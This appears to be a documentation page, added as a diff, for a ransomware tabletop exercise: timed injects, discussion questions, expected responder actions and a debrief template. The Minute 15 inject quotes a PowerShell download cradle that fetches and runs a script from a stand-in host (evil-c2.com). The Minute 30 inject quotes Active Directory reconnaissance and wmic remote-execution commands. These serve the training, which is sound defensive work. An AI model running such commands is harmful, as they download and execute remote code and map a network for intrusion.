@@ -1,0 +1,201 @@
+---
+title: "IR Lab — Tabletop Exercise"
+description: "Hands-on incident response tabletop exercise. Simulate a spear-phishing attack leading to QuasarRAT and ransomware. Test your call tree, decision-making, and communication plan."
+sidebar:
+  order: 7
+  label: "IR Lab (Tabletop Exercise)"
+tab: "cybersecurity"
+---
+
+## Objective
+
+Conduct a structured tabletop exercise (TTX) simulating a realistic ransomware attack scenario. By the end of this lab, you will have tested your IR plan, call tree, escalation procedures, and communication templates under realistic pressure.
+
+## Scenario Overview
+
+Your organisation (a mid-size financial services firm with 2,000 employees) is experiencing a ransomware incident that started with a spear-phishing email.
+
+**Scenario timeline**: 90 minutes simulated (injects at 0, 15, 30, 45, 60 minutes)
+
+## Setup
+
+### Participants
+
+| Role | Participant | Notes |
+|------|-------------|-------|
+| **IR Lead** | (Your name) | Facilitates the exercise, makes containment decisions |
+| **L1 Analyst** | (Team member) | Receives initial alert, triages |
+| **L2 Investigator** | (Team member) | Deep analysis, scoping |
+| **Legal Counsel** | (Team member) | Regulatory guidance |
+| **Communications** | (Team member) | Internal/external messaging |
+| **Executive Sponsor** | (Team member) | Business decisions, resource approval |
+| **Observer** | (Optional) | Takes notes, does not participate |
+
+### Materials Needed
+
+- IR plan document
+- Call tree (printed or accessible offline)
+- Incident ticket template
+- Communication templates (internal, external, regulatory)
+- Timer (90 minutes total)
+- Private chat channel (for inject delivery)
+- Whiteboard or shared document for timeline tracking
+
+## Exercise Script
+
+### Minute 0 — Alert Fires
+
+**Inject (read aloud):**
+
+> At 9:13 AM on Tuesday, your SIEM fires a Critical severity alert. The alert details: "Multiple failed logon attempts followed by successful logon from unusual geo-location (Russia) for user [CFO_Admin] — 150 failed attempts in 10 minutes, then 1 successful logon."
+
+**Discussion questions** (5 minutes):
+1. What is your immediate action?
+2. Activate the call tree — who do you call first and how?
+3. Do you isolate the affected user account immediately or investigate first?
+4. What additional data do you need to confirm or refute compromise?
+
+**Expected action**: Disable the user account, initiate call tree, assign L2 to investigate the logon.
+
+### Minute 15 — Confirmed Compromise
+
+**Inject:**
+
+> L2 investigation reveals:
+> - The successful logon originated from IP 185.130.5.213 (previously associated with TrickBot C2)
+> - Event 4648 (explicit credentials use) shows the CFO_Admin account was used to authenticate to server FIN-SRV-03
+> - Sysmon Event 1 (process creation) on FIN-SRV-03 shows `powershell.exe -enc SQBFAFgAIAAo...` (base64-encoded download cradle)
+> - Decoded download cradle reveals: `IEX (New-Object Net.WebClient).DownloadString('https://evil-c2.com/loader.ps1')`
+
+**Discussion questions** (10 minutes):
+1. Update the incident severity — is this still High, or Critical now? Why?
+2. Do you contain the affected server, the user workstation, or both?
+3. What is your containment strategy — EDR isolation, NIC disable, or network block?
+4. Who needs to be notified NOW (legal, executive, regulators)?
+5. Draft a 2-sentence internal communication update.
+
+**Expected action**: Escalate to Critical. Contain affected hosts via EDR. Notify IR Lead, Legal, CISO. Draft internal alert.
+
+### Minute 30 — Lateral Movement Detected
+
+**Inject:**
+
+> EDR telemetry on FIN-SRV-03 reveals:
+> - The PowerShell download cradle executed a Cobalt Strike beacon
+> - The beacon established C2 to IP 203.0.113.50:443
+> - The attacker used Cobalt Strike to enumerate Active Directory: `net group "Domain Admins" /domain`
+> - The attacker then used `wmic /node:DC-01 process call create "cmd.exe /c whoami"` against the domain controller
+> - Event 4624 (successful logon) shows the attacker authenticated to DC-01 using a Domain Admin credential
+
+**Discussion questions** (10 minutes):
+1. The attacker has Domain Admin access. What does this mean for scope?
+2. Do you shut down the entire network or target containment?
+3. What is your strategy for protecting the remaining domain controllers?
+4. How do you determine which credentials are compromised?
+5. Do you reset all domain admin passwords now or wait?
+
+**Expected action**: Emergency domain-wide credential reset. Isolate domain controllers. Block C2 IP at firewall. Begin scoping entire domain compromise.
+
+### Minute 45 — Ransomware Deployment
+
+**Inject:**
+
+> The SOC L1 analyst alerts you that 40+ servers across the finance and HR departments are showing mass file rename events:
+> - Files renamed with extension `.encrypted`
+> - Ransom notes named `README_TO_DECRYPT.html` appearing on shared drives
+> - The ransom note demands $2.5 million in Bitcoin, payable within 72 hours
+> - The note also claims 500GB of sensitive data has been exfiltrated
+
+**Discussion questions** (10 minutes):
+1. Confirm: isolate hosts first or investigate first?
+2. Do you shut down the entire network? What are the business consequences?
+3. How do you protect backup systems from being encrypted?
+4. Do you disconnect the network from the internet entirely?
+5. Who makes the decision about ransom payment?
+
+**Expected action**: Mass EDR isolation of all affected hosts. Block all outbound traffic. Verify backup immutability. Escalate to executive team for ransom decision discussion.
+
+### Minute 60 — Ransomware Leak Site
+
+**Inject:**
+
+> Your threat intelligence team reports that the ransomware group has posted a sample of the stolen data on their dark web leak site. The sample includes:
+> - HR employee records with PII (names, addresses, SSNs)
+> - Finance department spreadsheets with bank account numbers
+> - Board meeting minutes from last quarter
+
+**Discussion questions** (15 minutes):
+1. What are your regulatory notification obligations? (GDPR? SEC? CISA?)
+2. Draft a notification to your data protection authority (e.g., ICO) — what must you include?
+3. Draft a customer notification email — what do you say, and what do you NOT say?
+4. Prepare a press statement — one paragraph for the CEO to read.
+5. Do you contact law enforcement? When and how?
+
+**Expected action**: Concurrent regulatory, customer, and press notification preparation. Engage law enforcement (FBI, CISA). Begin legal hold for litigation.
+
+### Minute 75 — Backups Verified
+
+**Inject:**
+
+> Your backup team confirms:
+> - Immutable backups on S3 Object Lock are intact and unaffected
+> - Air-gapped tape backups from 3 days ago are available and verified
+> - The most recent backup before the compromise is clean (confirmed by scanning restored file sample)
+> - Estimated restoration time: 18 hours for critical systems, 48 hours for full environment
+
+**Discussion questions** (10 minutes):
+1. Do you restore from backups or pay the ransom? What factors inform this decision?
+2. What is your restoration priority order?
+3. How do you verify cleaned systems before reconnecting to production?
+4. What monitoring will you have in place during restoration to detect re-infection?
+
+**Expected action**: Decision to restore from immutable backups. Establish restoration priority: Domain Controllers → Critical Applications → File Servers → Workstations. Enhanced monitoring during recovery.
+
+### Minute 90 — Hotwash (Debrief)
+
+**Discussion questions** (15 minutes):
+
+1. **Call tree**: Did the call tree work as designed? Were alternates reachable? How long did activation take?
+2. **Decision-making**: What was the hardest decision? What information was missing when you needed it?
+3. **Communication**: Were the right people notified at the right time? Was communication clear and actionable?
+4. **Playbooks**: Were the playbooks followed? Did they help, hinder, or were they not found?
+5. **Gaps identified**: List 3-5 specific gaps the exercise revealed in your IR capability.
+6. **Improvement actions**: For each gap, assign an owner and target completion date.
+
+## Deliverables
+
+1. **Incident timeline**: Document the full timeline from alert to restoration decision
+2. **Call tree test results**: Who was reached, how long did it take, any failures
+3. **Communication templates**: Draft internal comms, customer notification, and press statement
+4. **Improvement action tracker**: At least 5 specific, owner-assigned improvement actions
+
+## Debrief Template
+
+```
+EXERCISE TITLE: Ransomware Tabletop Exercise
+DATE: 2026-01-16
+FACILITATOR: [Name]
+PARTICIPANTS: [Names]
+
+STRENGTHS:
+1. [What went well]
+2. [What went well]
+
+GAPS IDENTIFIED:
+1. [Gap] → [Owner] → [Due date]
+2. [Gap] → [Owner] → [Due date]
+3. [Gap] → [Owner] → [Due date]
+
+IMPROVEMENT ACTIONS:
+| # | Action | Owner | Due Date | Status |
+|---|--------|-------|----------|--------|
+| 1 | | | | Open |
+| 2 | | | | Open |
+| 3 | | | | Open |
+
+NEXT TTX DATE: [Schedule within 90 days]
+```
+
+<Aside variant="tip">
+The purpose of a tabletop exercise is NOT to validate that everything works — it's to FIND gaps. If your team thinks the exercise went perfectly, you didn't push hard enough. A good TTX should feel slightly uncomfortable and produce at least 5 improvement actions.
+</Aside>
